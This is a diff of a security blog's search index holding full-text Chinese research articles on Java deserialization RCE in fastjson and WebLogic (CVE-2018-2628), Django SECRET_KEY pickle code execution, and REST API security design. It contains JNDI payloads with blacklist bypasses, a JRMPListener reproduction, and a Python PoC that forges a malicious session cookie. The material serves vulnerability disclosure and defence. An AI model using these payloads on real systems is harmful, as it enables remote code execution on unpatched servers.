@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[先知议题 Java反序列化实战 解读]]></title>
+    <url>%2F2018%2F06%2F20%2F%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB%2F</url>
+    <content type="text"><![CDATA[1 议题和个人介绍1.1 议题概述2017年又是反序列漏洞的大年，涌现了许多经典的因为反序列化导致的远程代码执行漏洞，像fastjson，jackson，struts2，weblogic这些使用量非常大的产品都存在这类漏洞，但不幸的是，这些漏洞的修复方式都是基于黑名单，每次都是旧洞未补全，新洞已面世。随着虚拟货币的暴涨，这些直接的远程执行代码漏洞都成了挖矿者的乐园。本议题将从那些经典案例入手，分析攻击方和防御方的对抗过程。首先是fastjson的最近的安全补丁的分析，由于黑名单做了加密处理，这里会展开如何得到其黑名单，如何构造PoC。当然2018年的重点还是weblogic，由我给大家剖析CVE-2018-2628及其他Weblogic经典漏洞，带大家傲游反序列化的世界，同时也是希望开发者多多借鉴做好安全编码。 1.2 个人简介：本文作者来自绿盟科技，现任网络安全攻防实验室安全研究经理，安全行业从业七年，是看雪大会讲师，Pycon大会讲师，央视专访嘉宾，向RedHat、Apache、Amazon，Weblogic，阿里提交多份RCE漏洞报告，最近的Weblogic CVE-2018-2628就是一个。 个人博客：xxlegend.com 个人公众号:廖新喜 2 反序列化入门序列化和反序列化是java引入的数据传输存储接口，序列化是用于将对象转换成二进制串存储，对应着writeObject，而反序列正好相反，将二进制串转换成对象，对应着readObject，类必须实现反序列化接口，同时设置serialVersionUID以便适用不同jvm环境。可通过SerializationDumper这个工具来查看其存储格式,工具直接可在github上搜索.主要包括Magic头：0xaced,TC_OBJECT:0x73,TC_CLASS:0x72,serialVersionUID,newHandle使用场景:• http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等• Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）• xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）• json(Jackson，fastjson) http请求中包含 反序列攻击时序图: 常见的反序列化项目：• Ysoserial 原生序列化PoC生成• Marshalsec 第三方格式序列化PoC生成• Freddy burp反序列化测试插件• Java-Deserialization-Cheat-Sheet 3 fastjson3.1 简介Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化，示例代码如下：12345User user = new User("guest",2);String jsonString = JSON.toJSONString(user)String jsonString = "&#123;\"name\":\"guest\",\"age\":12&#125;"User user = (User)JSON.parse(jsonString) Fastjson PoC分类主要分为两大类，一个是基于TemplateImpl，另外就是基于基于JNDI，基于JNDI的又可分为a) Bean Property类型b) Field类型可以参考Demo：https://github.com/shengqi158/fastjson-remote-code-execute-poc fastjson为了防止研究人员研究它的黑名单，想出了一套新的黑名单机制，这套黑名单是基于具体类的hash加密算法，不可逆。如果是简单穷举，基本算不出来，后来我想到这些库的黑名单肯定都在Maven仓库中，于是写了个爬虫，爬取Maven仓库下所有类，然后正向匹配输出真正的黑名单类。 3.2 fastjson最近的几个经典漏洞下面这段代码是fastjson用来自定义loadClass的实现123456789101112131415public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123; //省略 if (className.charAt(0) == '[') &#123; Class&lt;?&gt; componen/tType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; if (className.startsWith("L") &amp;&amp; className.endsWith(";")) &#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; try &#123; if (classLoader != null) &#123; clazz = classLoader.loadClass(className); 首先我们来看一个经典的PoC，{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot; &quot;autoCommit&quot;:true},关于这个PoC的解读在我博客上有，这里不再详述，但是今天我们要讲的是前面贴出的一段loadClass导致的一系列漏洞，首先看1.2.41的绕过方法是Lcom.sun.rowset.RowSetImpl;,当时看到这个PoC的时候就在想官方不会只去掉一次第一个字符L和最后一个字符；吧，果不其然，在官方的修补方案中，如果以L打头，；结尾则会去掉打头和结尾。当时我就发了一个感概：补丁未出，漏洞已行。很显然，1.2.42的绕过方法是LLcom.sum.rowset.RowSetImpl;;,细心的读者还会看到loadClass的第一个if判断中还有[打头部分，所以就又有了1.2.43的绕过方法是 [com.sun.rowset.RowSetImp.在官方版本1.2.45黑名单中又添加了ibatis的黑名单，PoC如下:{&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:{&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;}}，首先这是一个基于JNDI的PoC，为了更加理解这个PoC，我们还是先来看一下JndiDataSourceFactory的源码。123456789101112131415161718192021public class JndiDataSourceFactory implements DataSourceFactory &#123; public static final String DATA_SOURCE = "data_source"; //省略 public void setProperties(Properties properties) &#123; try &#123; InitialContext initCtx = null; Hashtable env = getEnvProperties(properties); if (env == null) &#123; initCtx = new InitialContext(); &#125; else &#123; initCtx = new InitialContext(env); &#125; //省略 &#125; else if (properties.containsKey(DATA_SOURCE)) &#123; dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE)); &#125; &#125; catch (NamingException e) &#123; throw new DataSourceException("There was an error configuring JndiDataSourceTransactionPool. Cause: " + e, e); &#125; &#125; 其本质还是通过bean操作接口set来调用setProperties，然后触发JNDI查询。 4 weblogicWeblogic是第一个成功商业化的J2EE应用服务器，在大型企业中使用非常广泛。在Oracle旗下，可以与其他Oracle产品强强联手，WebLogic Server Java EE 应用基于标准化、模块化的组件，WebLogic Server 为这些模块提供了一组完整的服务，无需编程即可自动处理应用行为的许多细节，另外其独有的T3协议采用序列化实现。下图就是weblogic的历史漏洞展示： CVE-2015-4852基于T3• 新的攻击面• 基于commons-collections• 采用黑名单修复123456org.apache.commons.collections.functors* *com.sun.org.apache.xalan.internal.xsltc.trax* *javassist* *org.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.ConversionHandlerorg.codehaus.groovy.runtime.MethodClosure • 作用位置有限123weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStreamweblogic.rjvm.MsgAbbrevInputStream.classweblogic.iiop.Utils.class CVE-2016-0638首先来看下漏洞位置，在readExternal位置，1234567891011public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123; super.readExternal(var1); //省略 ByteArrayInputStream var4 = new ByteArrayInputStream(this.buffer); ObjectInputStream var5 = new ObjectInputStream(var4); //省略 try &#123; while (true) &#123; this.writeObject(var5.readObject()); &#125; &#125; catch (EOFException var9) &#123; 再来看看补丁，加了一个FilteringObjectInputStream过滤接口 1234567891011121314151617181920212223242526272829 public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123; super.readExternal(var1); //省略 this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)in) BufferInputStream is = this.payload.getInputStream(); FilteringObjectInputStream var5 = new FilteringObjectInputStream(var4); //省略 try &#123; while (true) &#123; this.writeObject(var5.readObject()); &#125; &#125; catch (EOFException var9) &#123;``` FilteringObjectInputStream的实现如下：```java public class FilteringObjectInputStream extends ObjectInputStream &#123; public FilteringObjectInputStream(InputStream in) throws IOException &#123; super(in); &#125; protected Class&lt;?&gt; resolveClass(java.io.ObjectStreamClass descriptor) throws ClassNotFoundException, IOException &#123; String className = descriptor.getName(); if(className != null &amp;&amp; className.length() &gt; 0 &amp;&amp; ClassFilter.isBlackListed(className)) &#123; throw new InvalidClassException("Unauthorized deserialization attempt", descriptor.getName()); &#125; else &#123; return super.resolveClass(descriptor); &#125; &#125;&#125; 其实就是在resolveClass位置加了一层黑名单控制。 基于XMLDecoder• CVE-2017-3506 由于使用了存在反序列化缺陷XMLDecoder导致的漏洞• CVE-2017-10271 是3506的绕过• 都是挖矿主力军• 基于http协议详细解读可参考我的博客：http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/ CVE-2017-324812345678910111213141516171819202122232425private static class ServerChannelInputStream extends ObjectInputStream implements ServerChannelStream &#123; protected Class resolveClass(ObjectStreamClass descriptor) throws ClassNotFoundException, IOException &#123; String className = descriptor.getName(); if(className != null &amp;&amp; className.length() &gt; 0 &amp;&amp; ClassFilter.isBlackListed(className)) &#123; throw new InvalidClassException("Unauthorized deserialization attempt", descriptor.getName()); &#125; else &#123; Class c = super.resolveClass(descriptor); //省略 &#125; &#125; protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123; String[] arr$ = interfaces; int len$ = interfaces.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; String intf = arr$[i$]; if(intf.equals("java.rmi.registry.Registry")) &#123; throw new InvalidObjectException("Unauthorized proxy deserialization"); &#125; &#125; return super.resolveProxyClass(interfaces); &#125; CVE-2017-3248 这个漏洞是根据JRMPListener来构造的，从这个补丁也可以看出，在resolveClass和resolveProxyClass都设置了黑名单。 CVE-2018-2628这个漏洞是我报给Oracle官方的，但是他们并没有修复完全，导致后来这个漏洞被滥用。• 完美绕过CVE-2017-3248• 基于StreamMessage封装• 利用java.rmi.activation.Activator绕过补丁中对java.rmi.registry.Registry的限制• Proxy非必须项攻击示意图如下：简单分析可见：http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/ 5 反序列化防御5.1 Weblogic防御• 过滤T3协议，限定可连接的IP• 设置Nginx反向代理，实现t3协议和http协议隔离• JEP290（JDK8u121，7u131，6u141），这个机制主要是在每层反序列化过程中都加了一层黑名单处理，黑名单如下：黑名单：12345678910maxdepth=100;!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!sun.rmi.server.UnicastRef;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.* 当然也有失效的时候，就是发现了新的gadget。这也促使Oracle开始放弃反序列化支持。 5.2 原生反序列化防御• 不要反序列化不可信的数据• 给反序列数据加密签名，并确保解密在反序列之前• 给反序列化接口添加认证授权• 反序列化服务只允许监听在本地或者开启相应防火墙• 升级第三方库• 升级JDK，JEP290 6 招人绿盟科技Web攻防实验室欢迎各位应聘，招聘大牛和实习生。团队专注于最前沿的Web攻防研究，大数据分析，前瞻性攻击与检测预研.联系邮箱： liaoxinxi[@]nsfocus.com 或者liwenjin[@]nsfocus.com pdf:]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>fastjson</tag>
+        <tag>Weblogic</tag>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CVE-2018-2628 简单复现与分析]]></title>
     <url>%2F2018%2F04%2F18%2FCVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[1，概述当地时间4月17日，北京时间4月18日凌晨，Oracle官方发布了4月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic反序列化漏洞(CVE-2018-2628)，这个漏洞是我在去年11月份报给Oracle的，通过该漏洞，攻击者可以在未授权的情况下远程执行任意代码。 参考链接： http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html 漏洞影响范围Weblogic 10.3.6.0 Weblogic 12.1.3.0 Weblogic 12.2.1.2 Weblogic 12.2.1.3 2，复现第一步发送测试PoC，PoC中远程连接的服务器地址就是第二步中所使用的服务器，攻击的ip是192.168.3.103的7001端口上的T3服务，该服务会解包Object结构，通过一步步的readObject去第二步服务器上的1099端口请求恶意封装的代码，然后在本地弹出计算器。 第二步在远程服务器上启用ysoserial.exploit.JRMPListener，JRMPListener会将含有恶意代码的payload发送回请求方。 查看weblogic的日志，可以看到如下错误，此时已经弹出计算器： 3，分析Weblogic已经将互联网暴露的PoC都已经加入了黑名单，如果要绕过他的黑名单的限制就只能自己动手构造。来看看InboundMsgAbbrev中resolveProxyClass的实现，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，其实随便找一个rmi接口即可绕过。 12345678910111213protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123; String[] arr$ = interfaces; int len$ = interfaces.length; for(int i$ = 0; i$ &lt; len$; ++i$) &#123; String intf = arr$[i$]; if(intf.equals("java.rmi.registry.Registry")) &#123; throw new InvalidObjectException("Unauthorized proxy deserialization"); &#125; &#125; return super.resolveProxyClass(interfaces);&#125; 其实核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。大致的调用栈如下：readObject:66, InboundMsgAbbrev (weblogic.rjvm), InboundMsgAbbrev.java-》readExternalData:1810, ObjectInputStream (java.io), ObjectInputStream.java—》readExternal:1433, StreamMessageImpl (weblogic.jms.common), StreamMessageImpl.java—–》readObject:455, RemoteObject (java.rmi.server), RemoteObject.java 披露时间线：2017/7/19：发现问题2017/11/23：报告给Oracle官方2017/11/29：Oracle官方接收2017/11/30：Oracle官方分配bug号(S0947640)，正式进入主线版本修复2017/11/30：索要公司域名邮箱2018/4/14：分配CVE，CVE-2018-26282018/4/17：发布补丁]]></content>
@@ -8,10 +22,10 @@
         <category>java</category>
       </categories>
       <tags>
+        <tag>RCE</tag>
         <tag>CVE-2018-2628</tag>
         <tag>Weblogic</tag>
         <tag>java</tag>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -22,9 +36,9 @@
         <category>Java</category>
       </categories>
       <tags>
-        <tag>RCE</tag>
         <tag>Spring</tag>
         <tag>表达式注入</tag>
+        <tag>RCE</tag>
         <tag>分析</tag>
         <tag>利用</tag>
       </tags>
@@ -37,13 +51,13 @@
         <category>Java</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
-        <tag>Struts2</tag>
+        <tag>Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告</tag>
+        <tag>fastjson</tag>
         <tag>XStream</tag>
         <tag>XMLDecoder</tag>
-        <tag>fastjson</tag>
-        <tag>Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告</tag>
+        <tag>反序列化</tag>
         <tag>WebLogic</tag>
+        <tag>Struts2</tag>
       </tags>
   </entry>
   <entry>
@@ -54,11 +68,11 @@
         <category>Java</category>
       </categories>
       <tags>
-        <tag>Weblogic</tag>
         <tag>RCE</tag>
-        <tag>反序列化</tag>
-        <tag>PoC</tag>
         <tag>XMLDecoder</tag>
+        <tag>反序列化</tag>
+        <tag>Weblogic</tag>
+        <tag>PoC</tag>
       </tags>
   </entry>
   <entry>
@@ -100,9 +114,9 @@
         <category>反序列化</category>
       </categories>
       <tags>
+        <tag>反序列化</tag>
         <tag>Java</tag>
         <tag>JSON</tag>
-        <tag>反序列化</tag>
         <tag>看雪</tag>
         <tag>安全开发者峰会</tag>
         <tag>反序列化防御</tag>
@@ -117,8 +131,8 @@
         <category>spring</category>
       </categories>
       <tags>
-        <tag>RCE</tag>
         <tag>表达式注入</tag>
+        <tag>RCE</tag>
         <tag>Spring DATA REST</tag>
         <tag>CVE-2017-8046</tag>
         <tag>PATCH</tag>
@@ -133,11 +147,11 @@
       </categories>
       <tags>
         <tag>RCE</tag>
+        <tag>XStream</tag>
         <tag>反序列化</tag>
         <tag>Struts2</tag>
         <tag>S2-052</tag>
         <tag>CVE-2017-9805</tag>
-        <tag>XStream</tag>
         <tag>xml</tag>
         <tag>imageio</tag>
       </tags>
@@ -150,8 +164,8 @@
         <category>Struts2</category>
       </categories>
       <tags>
-        <tag>S2-048</tag>
         <tag>Struts2</tag>
+        <tag>S2-048</tag>
         <tag>动态分析</tag>
         <tag>CVE-2017-9791</tag>
       </tags>
@@ -195,10 +209,10 @@
         <category>java</category>
       </categories>
       <tags>
-        <tag>java</tag>
-        <tag>反序列化</tag>
-        <tag>poc</tag>
         <tag>fastjson</tag>
+        <tag>反序列化</tag>
+        <tag>java</tag>
+        <tag>poc</tag>
       </tags>
   </entry>
   <entry>
@@ -360,6 +374,19 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[从Django的SECTET_KEY到代码执行]]></title>
+    <url>%2F2015%2F04%2F01%2F%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
+    <content type="text"><![CDATA[1 背景最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。 2 SECRET_KEY作用SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：1，json object的签名2，加密函数，如密码重置，表单，评论，csrf的key，session数据 这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行 3 代码执行3.1 settings的session设置django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39; 3.2 django 1.6以下在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。 3.3 session处理流程可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码12345class SessionMiddleware(object): def process_request(self, request): engine = import_module(settings.SESSION_ENGINE) session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None) request.session = engine.SessionStore(session_key) process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：123456789101112131415def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None): """ Reverse of dumps(), raises BadSignature if signature fails """ base64d = smart_str( TimestampSigner(key, salt=salt).unsign(s, max_age=max_age)) decompress = False if base64d[0] == '.': # It's compressed; uncompress it first base64d = base64d[1:] decompress = True data = b64_decode(base64d) if decompress: data = zlib.decompress(data) return serializer().loads(data) 3.4 构造POC12345678910111213141516171819202122import osos.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')from django.conf import settingsfrom django.core import signingfrom django.contrib.sessions.backends import signed_cookiesclass Run(object): def __reduce__(self): return (os.system,('touch /tmp/xxlegend.log',))sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')print sessimport urllib2import cookieliburl = 'http://10.24.35.228:8000/favicon.ico'headers = &#123;'Cookie':'sessionid="%s"' %(sess)&#125;request = urllib2.Request(url,headers = headers)response = urllib2.urlopen(request)print response.read() 通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。 总结利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。 https://github.com/danghvu/pwp/blob/master/exploit.pyhttps://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.htmlhttps://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/http://www.shysecurity.com/post/Reekeehttp://python.usyiyi.cn/django/topics/http/sessions.htmlhttps://github.com/django/django/blob/stable/1.5.x/django/core/signing.pyhttp://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Django</tag>
+        <tag>SECRET_KEY</tag>
+        <tag>代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[REST API安全设计指南]]></title>
     <url>%2F2015%2F04%2F01%2FREST%20API%20%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97%2F</url>
     <content type="text"><![CDATA[1，REST API 简介REST的全称是REpresentational State Transfer，表示表述性无状态传输，无需session，所以每次请求都得带上身份认证信息。rest是基于http协议的，也是无状态的。只是一种架构方式，所以它的安全特性都需我们自己实现，没有现成的。建议所有的请求都通过https协议发送。RESTful web services 概念的核心就是“资源”。 资源可以用 URI 来表示。客户端使用 HTTP 协议定义的方法来发送请求到这些 URIs，当然可能会导致这些被访问的”资源“状态的改变。HTTP请求对应关系如下：123456789========== ===================== ========================HTTP 方法 行为 示例========== ===================== ========================GET 获取资源的信息 http://xx.com/api/ordersGET 获取某个特定资源的信息 http://xx.com/api/orders/123POST 创建新资源 http://xx.com/api/ordersPUT 更新资源 http://xx.com/api/orders/123DELETE 删除资源 http://xx.com/api/orders/123========== ====================== ======================= 对于请求的数据一般用json或者xml形式来表示，推荐使用json。 2，身份认证身份认证包含很多种，有HTTP Basic，HTTP Digest，API KEY，Oauth，JWK等方式，下面简单讲解下： ##2.1 HTTP BasicREST由于是无状态的传输，所以每一次请求都得带上身份认证信息，身份认证的方式，身份认证的方式有很多种，第一种便是http basic，这种方式在客户端要求简单，在服务端实现也非常简单，只需简单配置apache等web服务器即可实现，所以对于简单的服务来说还是挺方便的。但是这种方式安全性较低，就是简单的将用户名和密码base64编码放到header中。123base64编码前：Basic admin:adminbase64编码后：Basic YWRtaW46YWRtaW4=放到Header中：Authorization: Basic YWRtaW46YWRtaW4= 正是因为是简单的base64编码存储，切记切记在这种方式下一定得注意使用ssl，不然就是裸奔了。在某些产品中也是基于这种类似方式，只是没有使用apache的basic机制，而是自己写了认证框架，原理还是一样的，在一次请求中base64解码Authorization字段，再和认证信息做校验。很显然这种方式有问题，认证信息相当于明文传输，另外也没有防暴力破解功能。 ##2.2 API KEYAPI Key就是经过用户身份认证之后服务端给客户端分配一个API Key，类似：http://example.com/api?key=dfkaj134,一般的处理流程如下：一个简单的设计示例如下：client端： server端： client端向服务端注册，服务端给客户端发送响应的api_key以及security_key，注意保存不要泄露，然后客户端根据api_key,secrity_key,timestrap,rest_uri采用hmacsha256算法得到一个hash值sign，构造途中的url发送给服务端。服务端收到该请求后，首先验证api_key,是否存在，存在则获取该api_key的security_key，接着验证timestrap是否超过时间限制，可依据系统成而定，这样就防止了部分重放攻击，途中的rest_api是从url获取的为/rest/v1/interface/eth0,最后计算sign值，完之后和url中的sign值做校验。这样的设计就防止了数据被篡改。通过这种API Key的设计方式加了时间戳防止了部分重放，加了校验，防止了数据被篡改，同时避免了传输用户名和密码，当然了也会有一定的开销。 2.3 Oauth1.0a或者Oauth2OAuth协议适用于为外部应用授权访问本站资源的情况。其中的加密机制与HTTP Digest身份认证相比，安全性更高。使用和配置都比较复杂，这里就不涉及了。 2.4 JWTJWT 是JSON Web Token，用于发送可通过数字签名和认证的东西，它包含一个紧凑的，URL安全的JSON对象，服务端可通过解析该值来验证是否有操作权限，是否过期等安全性检查。由于其紧凑的特点，可放在url中或者 HTTP Authorization头中，具体的算法就如下图 3 授权身份认证之后就是授权，根据不同的身份，授予不同的访问权限。比如admin用户，普通用户，auditor用户都是不同的身份。简单的示例：12345678910$roles = array('ADMIN'=&gt;array('permit'=&gt;array('/^((\/system\/(clouds|device)$/'), // 允许访问哪些URL的正则表达式'deny'=&gt;array('/^(\/system\/audit)$/') // 禁止访问哪些URL的正则表达式),'AUDIT'=&gt;array('permit'=&gt;array('/^(\/system\/audit)$/'),//允许访问的URL正则表达式'deny'=&gt;array('/^((\/system\/(clouds|device).*)$/'))); 上述是垂直权限的处理，如果遇到了平行权限的问题，如用户A获取用户B的身份信息或者更改其他用户信息，对于这些敏感数据接口都需要加上对用户的判断，这一步一般都在具体的逻辑实现中实现。 4 URL过滤在进入逻辑处理之前，加入对URL的参数过滤，如/site/{num}/policy 限定num位置为整数等，如果不是参数则直接返回非法参数，设定一个url清单，不在不在url清单中的请求直接拒绝，这样能防止开发中的api泄露。rest api接口一般会用到GET,POST,PUT,DELETE,未实现的方法则直接返回方法不允许，对于POST，PUT方法的数据采用json格式，并且在进入逻辑前验证是否json，不合法返回json格式错误。 5 重要功能加密传输第一步推荐SSL加密传输，同时对于系统中重要的功能做加密传输，如证书，一些数据，配置的备份功能，同时还得确保具备相应的权限，这一步会在授权中涉及。 6 速率限制请求速率限制，根据api_key或者用户来判断某段时间的请求次数，将该数据更新到内存数据库（redis，memcached），达到最大数即不接受该用户的请求，同时这样还可以利用到内存数据库key在特定时间自动过期的特性。在php中可以使用APC，Alternative PHP Cache (APC) 是一个开放自由的PHP opcode 缓存。它的目标是提供一个自由、 开放，和健全的框架用于缓存和优化PHP的中间代码。在返回时设置X-Rate-Limit-Reset:当前时间段剩余秒数，APC的示例代码如下：12345678910111213Route::filter('api.limit', function()&#123;$key = sprintf('api:%s', Auth::user()-&gt;api_key);// Create the key if it doesn't existCache::add($key, 0, 60);// Increment by 1$count = Cache::increment($key);// Fail if hourly requests exceededif ($count &gt; Config::get('api.requests_per_hour'))&#123;App::abort(403, 'Hourly request limit exceeded');&#125;&#125;); 7 错误处理对于非法的，导致系统出错的等请求都进行记录，一些重要的操作，如登录，注册等都通过日志接口输出展示。有一个统一的出错接口，对于400系列和500系列的错误都有相应的错误码和相关消息提示，如401：未授权；403：已经鉴权，但是没有相应权限。如不识别的url:{&quot;result&quot;:&quot;Invalid URL!&quot;},错误的请求参数{&quot;result&quot;:&quot;json format error&quot;},不允许的方法：{&quot;result&quot;:&quot;Method Not Allowed&quot;}，非法参数等。上面所说的都是单状态码，同时还有多状态码，表示部分成功，部分字符非法等。示例如下：12345678910111213141516171819202122HTTP/1.1 207 Multi-StatusContent-Type: application/json; charset=&quot;UTF-8&quot;Content-Length: XXXX&#123;&quot;OPT_STATUS&quot;: 207&quot;DATA&quot;: &#123; &quot;IP_ADDRESS&quot;: [&#123; &quot;INTERFACE&quot;: &quot;eth0&quot;, &quot;IP_LIST&quot;:[&#123; &quot;IP&quot;: &quot;192.168.1.1&quot;, &quot;MASK&quot;: &quot;255.255.0.0&quot;,&quot;MULTI_STATUS&quot;: 200, &quot;MULTI_RESULT&quot;: &quot;created successfully&quot; &#125;,&#123; &quot;IP&quot;: &quot;192.167.1.1&quot;, &quot;MASK&quot;: &quot;255.255.0.0&quot;,&quot;MULTI_STATUS&quot;: 409, &quot;MULTI_RESULT&quot;: &quot;invalid parameter&quot;&#125;]&#125;]&#125;, 8 重要ID不透明处理在系统一些敏感功能上，比如/user/1123 可获取id=1123用户的信息，为了防止字典遍历攻击，可对id进行url62或者uuid处理，这样处理的id是唯一的，并且还是字符安全的。 9 其他注意事项（1）请求数据，对于POST,DELETE方法中的数据都采用json格式，当然不是说rest架构不支持xml，由于xml太不好解析，对于大部分的应用json已经足够，近一些的趋势也是json越来越流行，并且json格式也不会有xml的一些安全问题，如xxe。使用json格式目前能防止扫描器自动扫描。（2）返回数据统一编码格式，统一返回类型，如Content-Type: application/json; charset=”UTF-8”（3）在逻辑实现中，json解码之后进行参数验证或者转义操作，第一步json格式验证，第二步具体参数验证基本上能防止大部分的注入问题了。（4）在传输过程中，采用SSL保证传输安全。（5）存储安全，重要信息加密存储，如认证信息hash保存。 总之，尽量使用SSL。]]></content>
@@ -371,19 +398,6 @@
         <tag>安全设计指南</tag>
         <tag>API KEY</tag>
         <tag>授权认证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[从Django的SECTET_KEY到代码执行]]></title>
-    <url>%2F2015%2F04%2F01%2F%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
-    <content type="text"><![CDATA[1 背景最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。 2 SECRET_KEY作用SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：1，json object的签名2，加密函数，如密码重置，表单，评论，csrf的key，session数据 这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行 3 代码执行3.1 settings的session设置django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39; 3.2 django 1.6以下在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。 3.3 session处理流程可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码12345class SessionMiddleware(object): def process_request(self, request): engine = import_module(settings.SESSION_ENGINE) session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None) request.session = engine.SessionStore(session_key) 